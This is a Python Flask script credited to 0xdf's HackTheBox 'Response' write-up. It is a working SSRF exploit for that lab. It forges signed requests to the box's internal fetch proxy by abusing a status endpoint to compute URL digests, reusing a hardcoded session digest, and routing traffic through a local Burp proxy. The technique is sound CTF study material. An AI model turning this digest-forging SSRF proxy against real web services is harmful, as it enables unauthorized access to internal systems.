##
##
## massive respect to 0xdf
## https://0xdf.gitlab.io/2023/02/04/htb-response.html
## https://gitlab.com/0xdf/ctfscripts/-/blob/master/htb-response/response_http.py
##
##

import base64
import os.path
import re
import requests
from flask import Flask, request, Response

app = Flask(__name__)
mimetypes = {"css": "text/css", "js": "application/javascript"}


def get_digest(target):
    cookies = {'PHPSESSID': target}
    resp = requests.get('http://www.response.htb/status/main.js.php',
                        cookies=cookies)
    digest = re.findall("'session_digest':'([a-f0-9]+)'", resp.text)[0]
    return digest


@app.route('/', defaults={'path': ''}, methods=["GET", "POST"])
@app.route('/<path:path>', methods=["GET", "POST"])
def all(path):
    target = request.url
    body = {
        "url": target,
        "url_digest": get_digest(target),
        "method": request.method,
        "session": "2f54d5421b84fbcf96ca7f4b7e8b28d7",
        "session_digest":"628ddf8d85a8adc6f84b08362dfff13de0cb0ee4698b642333e0f94db0de64f6"
    }
    if request.method == "POST":
        body['body'] = base64.b64encode(request.data).decode()
    resp = requests.post('http://proxy.response.htb/fetch', json=body, proxies={'http':'http://127.0.0.1:8080'})
    result = resp.json()
    if 'error' in result:
        return result
    if result['status_code'] == 200:
        body = base64.b64decode(result['body'])
        #print(body)
        mimetype = mimetypes.get(target.rsplit('.', 1)[-1], 'text/html')
        return Response(body, mimetype=mimetype)
    return resp.text


if __name__ == "__main__":
    app.run(debug=True, port=8001)

##    
##
##    
